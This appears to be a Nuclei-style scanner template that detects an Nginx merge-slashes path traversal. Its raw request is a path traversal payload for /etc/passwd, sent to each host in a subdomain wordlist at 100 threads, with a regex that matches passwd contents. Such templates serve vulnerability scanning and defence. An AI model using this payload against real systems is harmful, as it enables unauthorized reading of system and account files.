id: nginx-merge-slashes-path-traversal 1
info:
  author: dhiyaneshDk
  name: Nginx Merge Slashes Path Traversal
  reference: '- https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json

    - https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d

    '
  severity: medium
  tags: exposure,config,lfi,nginx
requests:
- attack: sniper
  matchers:
  - condition: or
    part: body
    regex:
    - 'root:.*:0:0:'
    - app.listen
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'GET ////////../../../etc/passwd HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101
    Firefox/65.0

    Connection: close

    Accept: */*

    Accept-Language: en

    Accept-Encoding: gzip

    '
  threads: 100
